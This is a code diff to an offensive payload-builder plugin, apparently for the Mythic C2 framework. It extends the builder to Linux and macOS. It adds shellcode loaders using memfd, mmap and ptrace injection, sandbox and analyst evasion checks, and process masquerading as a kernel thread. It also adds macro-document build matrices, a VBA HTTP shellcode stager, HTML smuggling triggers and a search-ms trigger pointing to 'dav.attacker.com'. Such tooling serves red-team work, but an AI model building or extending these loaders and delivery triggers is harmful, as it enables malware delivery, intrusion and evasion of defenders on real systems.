@@ -67,6 +67,12 @@ _REQUIRED_PLUGIN_FUNCTIONS = [
     "create_qr_html_trigger",
     "create_encrypted_html_smuggling_trigger", "create_geofenced_html_smuggling_trigger",
     "salt_text",
+    # Linux / macOS initial access triggers
+    "create_bash_trigger",
+    "create_desktop_trigger",
+    "create_applescript_trigger",
+    "create_command_trigger",
+    "create_pkg_trigger",
 ]
 _missing = [n for n in _REQUIRED_PLUGIN_FUNCTIONS if n not in globals()]
 if _missing:
@@ -328,7 +334,9 @@ class ErebusWrapper(PayloadType):
 
     file_extension = "zip"
     supported_os = [
-        SupportedOS.Windows
+        SupportedOS.Windows,
+        SupportedOS.Linux,
+        SupportedOS.MacOS,
     ]
 
     wrapper = True
@@ -347,6 +355,17 @@ class ErebusWrapper(PayloadType):
     agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"
 
     build_parameters = [
+        BuildParameter(
+            name="0.0 Target OS",
+            parameter_type=BuildParameterType.ChooseOne,
+            description=(
+                "Target operating system. Selects the appropriate trigger set. "
+                "Linux and macOS show platform-specific triggers and skip Windows-only loader options."
+            ),
+            choices=["Windows", "Linux", "macOS"],
+            default_value="Windows",
+        ),
+
         BuildParameter(
             name = "0.0 Main Payload Type",
             parameter_type = BuildParameterType.ChooseOne,
@@ -392,6 +411,9 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             ),
             default_value = False,
             required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+            ]
         ),
 
         BuildParameter(
@@ -431,8 +453,8 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             name = "0.0g Build All Configurations",
             parameter_type = BuildParameterType.Boolean,
             description = (
-                "Build all trigger types (BAT, HTA, HTML, ClickFix, URL, JS, CHM) and all container types "
-                "(Zip, 7z, ISO, VHD) from the compiled loader. Produces a master erebus_all_configs.zip "
+                "Build all trigger types and all container types "
+                "from the compiled loader. Produces a master erebus_all_configs.zip "
                 "with one sub-archive per variant. Normal trigger/container selections are ignored. "
                 "Use as a build pipeline to validate all delivery mechanisms at once."
             ),
@@ -444,10 +466,11 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             name = "0.1 Loader Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the type of loader to use",
-            choices = ["ClickOnce", "Shellcode Loader"],
+            choices = ["ClickOnce", "Shellcode Loader", "VM Loader"],
             default_value = "Shellcode Loader",
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -467,8 +490,9 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 ],
             default_value = "exe",
             hide_conditions = [
-                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -479,7 +503,8 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             choices = ["x64", "x86"],
             default_value = "x64",
             hide_conditions = [
-                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -490,7 +515,8 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             choices = ["release", "debug", "test"],
             default_value = "release",
             hide_conditions = [
-                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -502,6 +528,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "debug",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -513,6 +540,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "x64",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -533,9 +561,270 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "3",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="VM Loader"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
+        # VM Loader Injection Configuration (self-injection only)
+        BuildParameter(
+            name = "0.4a VM Loader - Injection Type",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = """Select the self-injection technique for the VM Loader:
+2 = CreateFiber (Self)
+6 = ModuleStomp (Self)
+7 = KernelCallbackTable (Self)""",
+            choices = ["2", "6", "7"],
+            default_value = "2",
+            hide_conditions = [
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="VM Loader"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+            ]
+        ),
+
+        # ── Linux Loader ──────────────────────────────────────────────────────
+        BuildParameter(
+            name="0.1-L Linux Loader Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Linux loader output format. ELF = standalone executable. SO = shared object (for LD_PRELOAD delivery).",
+            choices=["ELF", "Shared Object"],
+            default_value="ELF",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.2a-L Linux Architecture",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Target CPU architecture for the Linux loader.",
+            choices=["x86_64", "aarch64"],
+            default_value="x86_64",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.3-L Linux Build Configuration",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Release strips symbols and minimises binary size. Debug retains symbols for local testing.",
+            choices=["release", "debug"],
+            default_value="release",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.4-L Linux Injection Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description=(
+                "Linux shellcode execution technique:\n"
+                "1 = mmap_thread     - anonymous mmap(RWX) + pthread_create (self-inject)\n"
+                "2 = memfd_exec      - memfd_create file-backed mapping, kernel ≥ 3.17 (self-inject, lower anon-RWX signature)\n"
+                "3 = process_vm      - process_vm_writev + ptrace RIP hijack into remote process\n"
+                "4 = ptrace_inject   - ptrace POKEDATA + injected mmap syscall (x86-64 only, fallback for ptrace-restricted kernels)"
+            ),
+            choices=["1", "2", "3", "4"],
+            default_value="2",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5-L Linux Enable Guardrails",
+            parameter_type=BuildParameterType.Boolean,
+            description="Enable compile-time anti-analysis checks in the Linux loader.",
+            default_value=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5a-L Linux Check ptrace",
+            parameter_type=BuildParameterType.Boolean,
+            description="Detect active ptrace attachment by reading /proc/self/status TracerPid.",
+            default_value=True,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+                HideCondition(name="0.5-L Linux Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5b-L Linux Check Container",
+            parameter_type=BuildParameterType.Boolean,
+            description="Detect Docker/LXC/container execution via /proc/self/cgroup keyword scan.",
+            default_value=True,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+                HideCondition(name="0.5-L Linux Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5c-L Linux Blocked Hostnames",
+            parameter_type=BuildParameterType.String,
+            description="Comma-separated hostname substrings to block (case-insensitive).",
+            default_value="sandbox,malware,cuckoo,any.run",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+                HideCondition(name="0.5-L Linux Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5d-L Linux Blocked Usernames",
+            parameter_type=BuildParameterType.String,
+            description="Comma-separated username substrings to block (case-insensitive).",
+            default_value="analyst,malware,sandbox,user",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+                HideCondition(name="0.5-L Linux Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5e-L Linux Process Masquerade",
+            parameter_type=BuildParameterType.Boolean,
+            description="Rename the loader process via prctl(PR_SET_NAME) to hide it in ps/top.",
+            default_value=True,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5f-L Linux Masquerade Name",
+            parameter_type=BuildParameterType.String,
+            description="Process name to masquerade as (default mimics a kernel worker thread).",
+            default_value="[kworker/u:0]",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+                HideCondition(name="0.5e-L Linux Process Masquerade", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+
+        # ── macOS Loader ───────────────────────────────────────────────────────
+        BuildParameter(
+            name="0.1-M macOS Loader Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="macOS loader output format. MachO = standalone executable. Dylib = dynamic library.",
+            choices=["MachO", "Dylib"],
+            default_value="MachO",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.2a-M macOS Architecture",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Target CPU architecture. 'universal' produces a fat binary (x86_64 + arm64) via lipo.",
+            choices=["x86_64", "arm64", "universal"],
+            default_value="x86_64",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.3-M macOS Build Configuration",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Release strips symbols. Debug retains them for local testing.",
+            choices=["release", "debug"],
+            default_value="release",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.4-M macOS Injection Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description=(
+                "macOS shellcode execution technique:\n"
+                "1 = mmap_pthread   - MAP_JIT mmap + pthread_create. Works on x86_64 and arm64. "
+                "Recommended for hardened-runtime targets.\n"
+                "2 = mach_thread    - Mach vm_allocate + thread_create_running via task_self(). "
+                "Requires com.apple.security.cs.allow-jit entitlement on arm64."
+            ),
+            choices=["1", "2"],
+            default_value="1",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5-M macOS Enable Guardrails",
+            parameter_type=BuildParameterType.Boolean,
+            description="Enable compile-time anti-analysis checks in the macOS loader.",
+            default_value=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5a-M macOS Deny Attach",
+            parameter_type=BuildParameterType.Boolean,
+            description="Call ptrace(PT_DENY_ATTACH) at startup - kills any debugger that subsequently attaches.",
+            default_value=True,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+                HideCondition(name="0.5-M macOS Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5b-M macOS Check Debug",
+            parameter_type=BuildParameterType.Boolean,
+            description="Detect active debugger via sysctl KERN_PROC P_TRACED flag.",
+            default_value=True,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+                HideCondition(name="0.5-M macOS Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5c-M macOS Check Timing",
+            parameter_type=BuildParameterType.Boolean,
+            description="Detect single-stepping via mach_absolute_time loop timing (> 500 ms threshold).",
+            default_value=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+                HideCondition(name="0.5-M macOS Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5d-M macOS Blocked Hostnames",
+            parameter_type=BuildParameterType.String,
+            description="Comma-separated hostname substrings to block (case-insensitive).",
+            default_value="sandbox,malware,analyst",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+                HideCondition(name="0.5-M macOS Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5e-M macOS Blocked Usernames",
+            parameter_type=BuildParameterType.String,
+            description="Comma-separated username substrings to block (case-insensitive).",
+            default_value="analyst,malware,sandbox",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+                HideCondition(name="0.5-M macOS Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+
+        # ── Windows-only ────────────────────
         BuildParameter(
             name = "0.5 Shellcode Loader - Target Process",
             parameter_type = BuildParameterType.String,
@@ -543,9 +832,11 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "C:\\Windows\\System32\\notepad.exe",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="VM Loader"),
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="2"),
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="6"),
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="7"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -555,6 +846,9 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             parameter_type = BuildParameterType.Boolean,
             description = "Enable guardrails (environment and anti-debugging checks) for the loader",
             default_value = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+            ],
         ),
 
         BuildParameter(
@@ -765,6 +1059,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -780,6 +1075,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                 HideCondition(name="0.2a Loader Architecture", operand=HideConditionOperand.EQ, value="x86"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -825,6 +1121,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -841,6 +1138,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -886,6 +1184,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -905,6 +1204,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -923,6 +1223,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -974,7 +1275,32 @@ appdomain (self)""",
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
+        ),
+
+        BuildParameter(
+            name="0.9-L Linux Trigger Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Trigger delivery mechanism for Linux targets.",
+            choices=["Bash", "Desktop", "HTML", "QR"],
+            default_value="Bash",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Linux"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.9-M macOS Trigger Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Trigger delivery mechanism for macOS targets.",
+            choices=["Command", "AppleScript", "PKG", "HTML", "QR"],
+            default_value="Command",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="macOS"),
+            ],
         ),
 
         BuildParameter(
@@ -991,6 +1317,7 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="URL"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -1008,6 +1335,7 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="URL"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
@@ -1044,7 +1372,7 @@ appdomain (self)""",
         BuildParameter(
             name="0.9e HTML Password",
             parameter_type=BuildParameterType.String,
-            description="Password required to decrypt and trigger the payload. Stored as PBKDF2 hash in HTML — prevents automated sandbox detonation.",
+            description="Password required to decrypt and trigger the payload. Stored as PBKDF2 hash in HTML - prevents automated sandbox detonation.",
             default_value="Passw0rd!",
             required=False,
             hide_conditions=[
@@ -1122,7 +1450,7 @@ appdomain (self)""",
         BuildParameter(
             name="0.9k QR Code URL",
             parameter_type=BuildParameterType.String,
-            description="URL to encode in the QR code. The URL has no plaintext representation in the HTML source — defeats link scanner URL extraction.",
+            description="URL to encode in the QR code. The URL has no plaintext representation in the HTML source - defeats link scanner URL extraction.",
             default_value="https://login.microsoftonline.com/",
             required=False,
             hide_conditions=[
@@ -1190,8 +1518,8 @@ appdomain (self)""",
         BuildParameter(
             name="0.9 Create MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Create/backdoor Excel documents, export VBA module only, or disable MalDoc generation",
-            choices=["None", "Create/Backdoor Excel", "VBA Module Only"],
+            description="Create/Backdoor Document documents, export VBA module only, Generate All or disable MalDoc generation",
+            choices=["None", "Create/Backdoor Document", "VBA Module Only", "Build Matrix"],
             default_value="None",
             required=False,
             hide_conditions=[
@@ -1303,8 +1631,8 @@ appdomain (self)""",
         BuildParameter(
             name="0.9g VBA Loader Technique",
             parameter_type=BuildParameterType.ChooseOne,
-            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (APC), ProcessHollowing (remote), EarlyBird (suspended process hijack)",
-            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "Process Hollowing", "Early-Bird Injection"],
+            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (self-APC), AddressOfEntryPoint (overwrite child entry point, no RWX), EarlyBird (suspended process APC hijack)",
+            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "AddressOfEntryPoint Injection", "Early-Bird Injection"],
             default_value="VirtualAlloc + CreateThread",
             required=False,
             hide_conditions=[
@@ -1348,6 +1676,86 @@ appdomain (self)""",
                 HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                 HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
                 HideCondition(name="0.9p MalDoc Output Format", operand=HideConditionOperand.NotEQ, value="docx-remote-template"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9r Matrix Loaders",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Comma-separated VBA loader techniques for the matrix build. "
+                "Valid: createthread, enumlocales, queueuserapc, process_hollowing. "
+                "Leave blank to include all four."
+            ),
+            default_value="createthread,enumlocales,queueuserapc,process_hollowing",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.NotEQ, value="Build Matrix"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9s Matrix Triggers",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Comma-separated VBA execution triggers for the matrix build. "
+                "Valid: AutoOpen, OnClose, OnSave. "
+                "Leave blank to include all three."
+            ),
+            default_value="AutoOpen,OnClose,OnSave",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.NotEQ, value="Build Matrix"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9t Matrix Formats",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Comma-separated document formats for the matrix build. "
+                "Valid: xlsm, xlam, docm, pptm, ppam. "
+                "Leave blank to include all five."
+            ),
+            default_value="xlsm,xlam,docm,pptm,ppam",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.NotEQ, value="Build Matrix"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9u Matrix Zip Output",
+            parameter_type=BuildParameterType.Boolean,
+            description="Pack the full matrix output directory into a single .zip after build.",
+            default_value=True,
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.NotEQ, value="Build Matrix"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9v HTTP Stager URL",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Optional: stage the shellcode via Mythic instead of embedding it in VBA. "
+                "Provide the Mythic server (or redirector) URL - e.g. https://192.168.93.132:7443. "
+                "Builder RC4-encrypts shellcode, uploads to Mythic file store, constructs "
+                "https://<host>/direct/download/<uuid> and embeds it in a tiny VBA downloader. "
+                "No shellcode in VBA source - bypasses module size limits for any payload size. "
+                "Leave blank to embed shellcode normally."
+            ),
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
+                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.NotEQ, value="Shellcode Injection"),
             ]
         ),
 
@@ -2771,8 +3179,9 @@ generated if none have been entered.""",
             # Infra
             ("7.0 Generate Redirector Configs", True, [("T1090.002", "External Proxy / Redirector")]),
             # Maldoc
-            ("0.9 Create MalDoc", "Excel (XLSM)", [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
-            ("0.9 Create MalDoc", "VBA",           [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
+            ("0.9 Create MalDoc", "Excel (XLSM)",  [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
+            ("0.9 Create MalDoc", "VBA",            [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
+            ("0.9 Create MalDoc", "Build Matrix",   [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
         ]
 
         lines = [
@@ -2883,6 +3292,23 @@ generated if none have been entered.""",
             sections.append(f"\n# {'='*72}\n# Module: {mod_name}\n# {'='*72}\n")
             sections.append(filtered)
 
+        # 2b. Inline vba_compiler so the ZIP fallback works on the operator host
+        #     without requiring the full erebus_wrapper package.
+        vba_compiler_src = helper_src.parent / "vba_compiler"
+        vc_strip = ("from .compression import", "from .compiler import",
+                    "from agent_code.vba_compiler", "from vba_compiler import")
+        for vc_mod in ("compression", "compiler"):
+            vc_path = vba_compiler_src / f"{vc_mod}.py"
+            if not vc_path.exists():
+                continue
+            vc_src = vc_path.read_text(encoding="utf-8")
+            vc_filtered = "\n".join(
+                line for line in vc_src.splitlines()
+                if not any(line.startswith(p) for p in vc_strip)
+            )
+            sections.append(f"\n# {'='*72}\n# vba_compiler: {vc_mod}\n# {'='*72}\n")
+            sections.append(vc_filtered)
+
         # 3. Emit main.py, dropping only the 'from modules.*' import lines
         main_path = helper_src / "main.py"
         main_src = main_path.read_text(encoding="utf-8")
@@ -2992,6 +3418,46 @@ generated if none have been entered.""",
                 payload_dir=w / "payload",
                 download_name=_find_exe(w).name,
                 obfuscate_b64=True)),
+            ("MSI", lambda w: create_msi_payload_trigger(
+                payload_exe="erebus.exe",
+                payload_dir=w / "payload",
+                decoy_file=decoy_file)),
+            ("MSC", lambda w: create_msc_explorer_trigger(
+                payload_exe="erebus.exe",
+                payload_dir=w / "payload",
+                decoy_file=decoy_file)),
+            ("HTML-Encrypted", lambda w: create_encrypted_html_smuggling_trigger(
+                payload_path=str(_find_exe(w)),
+                password="Passw0rd!",
+                output_filename="document.html",
+                download_name=_find_exe(w).name,
+                payload_dir=w / "payload")),
+            ("HTML-Geofenced", lambda w: create_geofenced_html_smuggling_trigger(
+                payload_path=str(_find_exe(w)),
+                allowed_countries=["US", "GB", "CA"],
+                fallback_redirect="https://www.microsoft.com",
+                output_filename="document.html",
+                download_name=_find_exe(w).name,
+                payload_dir=w / "payload")),
+            ("SearchMS", lambda w: create_searchms_trigger(
+                webdav_host="dav.attacker.com",
+                webdav_share="share",
+                webdav_ssl=True,
+                display_name="System Update",
+                output_filename="document.html",
+                payload_dir=w / "payload")),
